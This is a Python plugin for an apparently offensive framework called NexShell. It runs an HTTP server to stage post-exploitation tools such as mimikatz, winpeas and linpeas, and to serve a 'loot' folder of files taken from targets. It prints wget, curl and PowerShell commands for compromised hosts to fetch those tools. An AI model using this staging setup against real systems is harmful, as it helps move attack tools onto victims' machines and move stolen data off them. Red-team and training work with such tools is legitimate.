#!/usr/bin/env python3
"""
NexShell Plugin — Local File Sharer v2.0 (2026 Edition)
Smart file sharing with automatic port detection (9001-9100).
Default share directory: nexshell/tools/  (inside the project).

Directory layout inside nexshell/tools/:
  tools/
  ├── linux/     — Linux binaries  (linpeas, pspy, socat, chisel …)
  ├── windows/   — Windows binaries (winpeas, mimikatz, Rubeus …)
  ├── scripts/   — Helper scripts
  └── loot/      — Files extracted from targets (written automatically)

Features:
  - Default dir resolves to  <project_root>/tools/
  - Shortcuts: --linux  --windows  --scripts  --loot
  - Auto port detection (9001-9100)
  - HTTP file server — stdlib only, zero deps
  - ASCII URL box + file listing
  - Multiple simultaneous shares
  - Download counter, auto-stop after N downloads

MITRE ATT&CK:
  - T1105 (Ingress Tool Transfer)

Usage:
    (NexShell)> plugins run local-file-sharer              # share tools/
    (NexShell)> plugins run local-file-sharer --linux       # share tools/linux/
    (NexShell)> plugins run local-file-sharer --windows     # share tools/windows/
    (NexShell)> plugins run local-file-sharer --scripts     # share tools/scripts/
    (NexShell)> plugins run local-file-sharer --loot        # share tools/loot/
    (NexShell)> plugins run local-file-sharer --dir /custom/path
    (NexShell)> plugins run local-file-sharer --file tools/linux/linpeas.sh
    (NexShell)> plugins run local-file-sharer --stop
    (NexShell)> plugins run local-file-sharer --list
    (NexShell)> plugins run local-file-sharer --detect
"""

import os
import re
import time
import socket
import threading
import http.server
import socketserver
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from core.plugin import NexPlugin

# ── Project-relative paths ───────────────────────────────────────────────────
# Resolves correctly regardless of where nexshell.py is launched from.
_PLUGIN_DIR  = os.path.dirname(os.path.abspath(__file__))   # nexshell/plugins/
PROJECT_ROOT = os.path.dirname(_PLUGIN_DIR)                 # nexshell/
TOOLS_DIR    = os.path.join(PROJECT_ROOT, "tools")          # nexshell/tools/

# Sub-directories inside tools/
TOOLS_LINUX   = os.path.join(TOOLS_DIR, "linux")
TOOLS_WINDOWS = os.path.join(TOOLS_DIR, "windows")
TOOLS_SCRIPTS = os.path.join(TOOLS_DIR, "scripts")
TOOLS_LOOT    = os.path.join(TOOLS_DIR, "loot")

# Ensure all sub-directories exist at import time
for _d in (TOOLS_DIR, TOOLS_LINUX, TOOLS_WINDOWS, TOOLS_SCRIPTS, TOOLS_LOOT):
    os.makedirs(_d, exist_ok=True)


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class ShareSession:
    """Active file share session."""
    port: int
    directory: str
    url: str
    started_at: str
    active: bool = True
    download_count: int = 0
    files: List[str] = field(default_factory=list)
    auto_stop_after: int = 0      # 0 = unlimited

    def to_dict(self) -> dict:
        return asdict(self)


# ── Global share registry ────────────────────────────────────────────────────

_shares: Dict[int, ShareSession] = {}
_servers: Dict[int, socketserver.TCPServer] = {}
_share_lock = threading.Lock()


# ── Custom HTTP Handler ───────────────────────────────────────────────────────

class NexShareHandler(http.server.SimpleHTTPRequestHandler):
    """Custom handler with download tracking."""

    def log_message(self, format, *args):
        """Suppress default logging."""
        pass

    def log_request(self, code='-', size='-'):
        """Track downloads."""
        port = self.server.server_address[1]
        with _share_lock:
            if port in _shares:
                _shares[port].download_count += 1
                share = _shares[port]
                # Auto-stop if limit reached
                if share.auto_stop_after > 0 and share.download_count >= share.auto_stop_after:
                    share.active = False
                    threading.Thread(
                        target=lambda: _servers.get(port, None) and _servers[port].shutdown(),
                        daemon=True,
                    ).start()


# ── Port Finder ───────────────────────────────────────────────────────────────

class PortFinder:
    """Finds available ports in range."""

    @staticmethod
    def find_free_port(start: int = 9001, end: int = 9100) -> Optional[int]:
        """Find an available port in range."""
        for port in range(start, end + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(("", port))
                sock.close()
                return port
            except OSError:
                continue
        return None

    @staticmethod
    def detect_active_http_server(start: int = 9001, end: int = 9100) -> List[int]:
        """Detect which ports have active HTTP servers."""
        active = []
        for port in range(start, end + 1):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                if sock.connect_ex(("127.0.0.1", port)) == 0:
                    # Check if HTTP
                    try:
                        sock.sendall(b"GET / HTTP/1.0\r\n\r\n")
                        resp = sock.recv(32)
                        if resp.startswith(b"HTTP"):
                            active.append(port)
                    except Exception:
                        pass
                sock.close()
            except Exception:
                pass
        return active

    @staticmethod
    def get_local_ip() -> str:
        """Get the primary local IP address."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"


# ── ASCII QR Code Generator ───────────────────────────────────────────────────

class ASCIIQRGenerator:
    """Generates a simple ASCII URL display box (no external libs)."""

    @staticmethod
    def url_box(url: str) -> List[str]:
        """Generate a fancy URL display box."""
        width = max(len(url) + 6, 50)
        border = "━" * width
        lines = [
            f"  ┏{border}┓",
            f"  ┃  {'📁 FILE SHARE URL':^{width - 2}}  ┃",
            f"  ┃{'─' * width}┃",
            f"  ┃  {url:<{width - 2}}  ┃",
            f"  ┗{border}┛",
        ]
        return lines

    @staticmethod
    def file_list_box(files: List[Tuple[str, int]]) -> List[str]:
        """Generate a file listing box."""
        lines = ["  📂 Files available:"]
        for fname, size in files:
            size_str = f"{size:,} bytes" if size < 1024 else f"{size//1024:,} KB"
            lines.append(f"    📄 {fname:<40s} ({size_str})")
        return lines


# ── File Server Manager ───────────────────────────────────────────────────────

class FileServerManager:
    """Manages HTTP file share servers."""

    @staticmethod
    def start_server(directory: str,
                     port: int,
                     auto_stop_after: int = 0) -> ShareSession:
        """Start HTTP file server on given port."""
        directory = os.path.abspath(directory)
        os.makedirs(directory, exist_ok=True)

        # Create custom handler with directory
        handler_class = lambda *args, **kwargs: NexShareHandler(
            *args, directory=directory, **kwargs
        )

        server = socketserver.TCPServer(("", port), handler_class)
        server.allow_reuse_address = True

        files = []
        try:
            for fname in os.listdir(directory):
                fpath = os.path.join(directory, fname)
                if os.path.isfile(fpath):
                    files.append(fname)
        except Exception:
            pass

        local_ip = PortFinder.get_local_ip()
        url = f"http://{local_ip}:{port}"

        session = ShareSession(
            port=port,
            directory=directory,
            url=url,
            started_at=datetime.utcnow().isoformat(),
            active=True,
            files=files,
            auto_stop_after=auto_stop_after,
        )

        with _share_lock:
            _shares[port] = session
            _servers[port] = server

        t = threading.Thread(
            target=server.serve_forever,
            daemon=True,
            name=f"nexshell-share-{port}",
        )
        t.start()
        return session

    @staticmethod
    def stop_server(port: int) -> Optional[ShareSession]:
        """Stop a running server."""
        with _share_lock:
            srv = _servers.pop(port, None)
            session = _shares.get(port)
            if session:
                session.active = False

        if srv:
            try:
                srv.shutdown()
            except Exception:
                pass
        return session

    @staticmethod
    def stop_all():
        """Stop all running servers."""
        with _share_lock:
            ports = list(_servers.keys())
        for port in ports:
            FileServerManager.stop_server(port)

    @staticmethod
    def list_active() -> List[ShareSession]:
        """List active share sessions."""
        with _share_lock:
            return [s for s in _shares.values() if s.active]


# ── Single File Server ────────────────────────────────────────────────────────

class SingleFileServer:
    """Serves a single file on a given port."""

    @staticmethod
    def serve_file(filepath: str, port: int) -> str:
        """
        Serve a single file. Returns the URL.
        Creates a temp directory and symlinks the file.
        """
        import shutil
        tmpdir = os.path.join(
            os.path.expanduser("~/.nexshell/shares"),
            f"port_{port}_{int(time.time())}",
        )
        os.makedirs(tmpdir, exist_ok=True)
        fname = os.path.basename(filepath)
        dest = os.path.join(tmpdir, fname)

        try:
            shutil.copy2(filepath, dest)
        except Exception:
            return ""

        FileServerManager.start_server(tmpdir, port)
        local_ip = PortFinder.get_local_ip()
        return f"http://{local_ip}:{port}/{fname}"


# ── Main Plugin ──────────────────────────────────────────────────────────────

class LocalFileSharer(NexPlugin):
    name        = "local-file-sharer"
    description = "Smart file sharing — auto port detection (9001-9100), instant URL, download tracking"
    author      = "vulnquest58"
    version     = "2.0"
    platform    = "all"
    category    = "exfil"
    mitre_id    = "T1105"

    def run(self, session, args: list):
        # ── Parse args ───────────────────────────────────────────────────
        share_dir     = None
        share_file    = None
        stop_all      = False
        stop_port     = None
        list_mode     = False
        detect_mode   = False
        port_override = None
        auto_stop     = 0
        port_start    = 9001
        port_end      = 9100
        tree_mode     = False

        for a in (args or []):
            if a.startswith("--dir="):
                share_dir = a.split("=", 1)[1]
            elif a == "--dir" and args:
                pass  # handled by = format only
            # ── Shortcut flags for tools/ subdirectories ─────────────────
            elif a == "--linux":
                share_dir = TOOLS_LINUX
            elif a == "--windows":
                share_dir = TOOLS_WINDOWS
            elif a == "--scripts":
                share_dir = TOOLS_SCRIPTS
            elif a == "--loot":
                share_dir = TOOLS_LOOT
            elif a == "--tools":
                share_dir = TOOLS_DIR
            elif a == "--tree":
                tree_mode = True
            elif a.startswith("--file="):
                share_file = a.split("=", 1)[1]
            elif a == "--stop":
                stop_all = True
            elif a.startswith("--stop="):
                try: stop_port = int(a.split("=", 1)[1])
                except: pass
            elif a == "--list":
                list_mode = True
            elif a == "--detect":
                detect_mode = True
            elif a.startswith("--port="):
                try: port_override = int(a.split("=", 1)[1])
                except: pass
            elif a.startswith("--auto-stop="):
                try: auto_stop = int(a.split("=", 1)[1])
                except: pass
            elif a.startswith("--range="):
                parts = a.split("=", 1)[1].split("-")
                if len(parts) == 2:
                    try:
                        port_start = int(parts[0])
                        port_end = int(parts[1])
                    except: pass

        self.info("Local File Sharer v2.0 started")
        sections = []
        sections.append("\n" + "━" * 64)
        sections.append("  [📤 Local File Sharer v2.0 — NexShell Tools]")
        sections.append("━" * 64)
        sections.append(f"  Project root : {PROJECT_ROOT}")
        sections.append(f"  Tools dir    : {TOOLS_DIR}")

        # ── Tree mode — show tools/ layout ────────────────────────────────
        if tree_mode:
            sections.append("\n[*] Tools Directory Layout:")
            sections.append("─" * 64)
            for subdir_name in ("linux", "windows", "scripts", "loot"):
                subdir = os.path.join(TOOLS_DIR, subdir_name)
                try:
                    files = [f for f in os.listdir(subdir)
                             if not f.startswith(".") and
                             os.path.isfile(os.path.join(subdir, f))]
                    count = len(files)
                    sections.append(f"  📂 tools/{subdir_name}/  ({count} file{'s' if count != 1 else ''})")
                    for fname in sorted(files)[:10]:
                        fpath = os.path.join(subdir, fname)
                        size = os.path.getsize(fpath)
                        size_str = f"{size//1024:,} KB" if size >= 1024 else f"{size} B"
                        sections.append(f"      📄 {fname:<40s}  {size_str}")
                    if count > 10:
                        sections.append(f"      ... and {count - 10} more")
                except Exception:
                    sections.append(f"  📂 tools/{subdir_name}/  (empty)")
            sections.append("\n  Shortcuts:")
            sections.append("    > plugins run local-file-sharer --linux")
            sections.append("    > plugins run local-file-sharer --windows")
            sections.append("    > plugins run local-file-sharer --scripts")
            sections.append("    > plugins run local-file-sharer --loot")
            return "\n".join(sections)

        # ── Detect mode ───────────────────────────────────────────────────
        if detect_mode:
            sections.append("\n[*] Detecting Active HTTP Servers (9001-9100):")
            sections.append("─" * 64)
            active_ports = PortFinder.detect_active_http_server(port_start, port_end)
            if not active_ports:
                sections.append("  No active HTTP servers detected in range.")
            else:
                local_ip = PortFinder.get_local_ip()
                for p in active_ports:
                    sections.append(f"  🟢 Port {p}: http://{local_ip}:{p}")
            return "\n".join(sections)

        # ── List mode ─────────────────────────────────────────────────────
        if list_mode:
            sections.append("\n[*] Active File Shares:")
            sections.append("─" * 64)
            active = FileServerManager.list_active()
            if not active:
                sections.append("  No active shares.")
            else:
                for s in active:
                    sections.append(f"  🟢 Port {s.port:5d} | {s.url}")
                    sections.append(f"     Dir       : {s.directory}")
                    sections.append(f"     Downloads : {s.download_count}")
                    sections.append(f"     Files     : {', '.join(s.files[:5])}")
                    sections.append(f"     Stop      : plugins run local-file-sharer --stop={s.port}")
            return "\n".join(sections)

        # ── Stop mode ─────────────────────────────────────────────────────
        if stop_all:
            FileServerManager.stop_all()
            sections.append("\n  ⛔ All file shares stopped.")
            return "\n".join(sections)

        if stop_port:
            s = FileServerManager.stop_server(stop_port)
            if s:
                sections.append(f"\n  ⛔ Share on port {stop_port} stopped.")
                sections.append(f"     Total downloads: {s.download_count}")
            else:
                sections.append(f"\n  ❌ No active share on port {stop_port}")
            return "\n".join(sections)

        # ── Auto-detect port ──────────────────────────────────────────────
        sections.append("\n[*] Phase 1: Port Detection")
        sections.append("─" * 64)

        port = port_override or PortFinder.find_free_port(port_start, port_end)
        if not port:
            sections.append(f"  ❌ No free ports available in {port_start}-{port_end}")
            return "\n".join(sections)

        sections.append(f"  Auto-detected port : {port}")
        sections.append(f"  Local IP           : {PortFinder.get_local_ip()}")

        # ── Determine what to share ───────────────────────────────────────
        sections.append("\n[*] Phase 2: Starting Server")
        sections.append("─" * 64)

        if share_file:
            # Single file mode — resolve relative to project root if not absolute
            if not os.path.isabs(share_file):
                share_file = os.path.join(PROJECT_ROOT, share_file)
            share_file = os.path.expanduser(share_file)
            if not os.path.isfile(share_file):
                sections.append(f"  ❌ File not found: {share_file}")
                return "\n".join(sections)

            url = SingleFileServer.serve_file(share_file, port)
            fname = os.path.basename(share_file)
            try:
                size = os.path.getsize(share_file)
            except Exception:
                size = 0

            sections.append(f"  Mode      : Single file")
            sections.append(f"  File      : {fname} ({size:,} bytes)")
            sections.extend(ASCIIQRGenerator.url_box(url))

            # Download commands
            sections.append("\n  📋 Download Commands:")
            sections.append(f"    wget -q -O {fname} {url}")
            sections.append(f"    curl -s -o {fname} {url}")
            sections.append(f"    powershell -c \"iwr '{url}' -OutFile '{fname}'\"")

        else:
            # Directory share mode — default to nexshell/tools/
            if share_dir is None:
                share_dir = TOOLS_DIR
            # Resolve relative paths against project root
            if not os.path.isabs(share_dir):
                share_dir = os.path.join(PROJECT_ROOT, share_dir)
            share_dir = os.path.expanduser(share_dir)
            os.makedirs(share_dir, exist_ok=True)

            sess = FileServerManager.start_server(share_dir, port, auto_stop_after=auto_stop)

            sections.append(f"  Mode      : Directory")
            sections.append(f"  Directory : {share_dir}")
            if auto_stop > 0:
                sections.append(f"  Auto-stop : after {auto_stop} download(s)")

            sections.extend(ASCIIQRGenerator.url_box(sess.url))

            # File listing
            try:
                files_with_size = []
                for fname in sorted(os.listdir(share_dir)):
                    fpath = os.path.join(share_dir, fname)
                    if os.path.isfile(fpath):
                        files_with_size.append((fname, os.path.getsize(fpath)))

                if files_with_size:
                    sections.append("")
                    sections.extend(ASCIIQRGenerator.file_list_box(files_with_size))
                    sections.append("")

                    # Per-file download commands
                    sections.append("  📋 Per-file commands:")
                    local_ip = PortFinder.get_local_ip()
                    for fname, _ in files_with_size[:5]:
                        sections.append(f"    wget {sess.url}/{fname}")
                    if len(files_with_size) > 5:
                        sections.append(f"    ... and {len(files_with_size) - 5} more")
                else:
                    sections.append(f"\n  ⚠  Directory is empty. Add files to: {share_dir}")
            except Exception as e:
                sections.append(f"  ⚠  Could not list files: {e}")

            # Loot
            self.loot(
                f"File share started on port {port}: {share_dir}",
                category="exfil",
                source=self.name,
            )
            self.emit(
                "timeline.event",
                title=f"File Share: port {port} serving {share_dir}",
                type="exfil",
                plugin=self.name,
            )

        # ── Management commands ───────────────────────────────────────────
        sections.append("\n  🛠  Management:")
        sections.append(f"    Tree view : plugins run local-file-sharer --tree")
        sections.append(f"    Linux dir : plugins run local-file-sharer --linux")
        sections.append(f"    Windows   : plugins run local-file-sharer --windows")
        sections.append(f"    List all  : plugins run local-file-sharer --list")
        sections.append(f"    Stop this : plugins run local-file-sharer --stop={port}")
        sections.append(f"    Stop all  : plugins run local-file-sharer --stop")

        self.info(f"Local File Sharer active on port {port}")
        return "\n".join(sections)
